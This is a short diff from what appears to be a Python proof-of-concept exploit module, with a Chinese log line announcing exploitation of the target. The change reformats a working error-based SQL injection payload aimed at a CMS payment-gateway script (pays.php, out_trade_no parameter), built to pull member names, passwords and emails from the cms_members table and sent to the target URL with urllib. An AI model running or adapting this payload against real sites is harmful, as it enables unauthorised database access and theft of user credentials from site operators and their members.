@@ -79,10 +79,7 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
 
-            payload = ("/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20"
-                       "FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,"
-                       "0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20"
-                       "FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'")
+            payload = "/include/paygate/alipay/pays.php?out_trade_no=22'%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20concat(0x3a,mname,0x3a,password,0x3a,email,0x3a)%20from%20cms_members%20limit%200,1),FLOOR(RAND(0)*2))X%20FROM%20information_schema.tables%20GROUP%20BY%20X)a)%20AND'"
 
             verify_url = '{target}'.format(target=self.target)+payload
             content = str(urllib.request.urlopen(
